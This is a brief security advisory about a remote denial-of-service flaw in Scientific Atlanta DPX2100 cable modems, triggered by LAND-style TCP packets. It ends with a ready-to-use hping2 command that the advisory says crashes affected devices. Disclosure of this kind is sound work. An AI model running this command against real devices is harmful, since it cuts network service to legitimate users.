source: www.securityfocus.com/bid/15870/info

Scientific Atlanta DPX2100 cable modems are prone to a denial of service vulnerability.

These devices are susceptible to a remote denial of service vulnerability when handling TCP 'LanD' packets.

This issue allows remote attackers to crash affected devices, or to temporarily block further network routing functionality. This will deny further network services to legitimate users.

Scientific Atlanta DPX2100 cable modems are reportedly affected by this issue. Due to code reuse among devices, other devices may also be affected. 

The following Hping2 command is sufficient to crash affected devices. The IP addresses must both be configured on the targeted device:

hping2 -A -S -P -U 1.2.3.4 -s 80 -p 80 -a 192.168.1.1